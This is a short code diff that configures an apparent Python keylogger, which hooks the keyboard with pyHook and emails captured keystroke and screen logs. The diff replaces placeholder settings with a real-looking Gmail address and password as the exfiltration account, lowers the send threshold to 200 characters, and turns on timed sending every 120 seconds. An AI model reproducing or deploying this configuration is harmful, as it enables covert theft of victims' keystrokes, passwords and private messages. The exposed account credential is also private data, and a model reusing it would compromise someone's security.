@@ -15,12 +15,12 @@ from email.MIMEMultipart import MIMEMultipart; from email.MIMEImage import MIMEI
 from pyHook import GetKeyState, HookConstants
 
 
-strEmailAc = "email@gmail.com"
-strEmailPass = "pass"
+strEmailAc = "forlogs89@gmail.com"
+strEmailPass = "INLA,IANAAR"
 
-intCharPerSend = 1000  # set num of chars before send log/store
+intCharPerSend = 200  # set num of chars before send log/store
 
-blnUseTime = "False"  # if you prefer to use a timer to send/save logs, set this to True
+blnUseTime = "True"  # if you prefer to use a timer to send/save logs, set this to True
 intTimePerSend = 120  # set how often to send/save logs in seconds
 
 blnStoreLocal = "False"  # True to save logs/screens locally
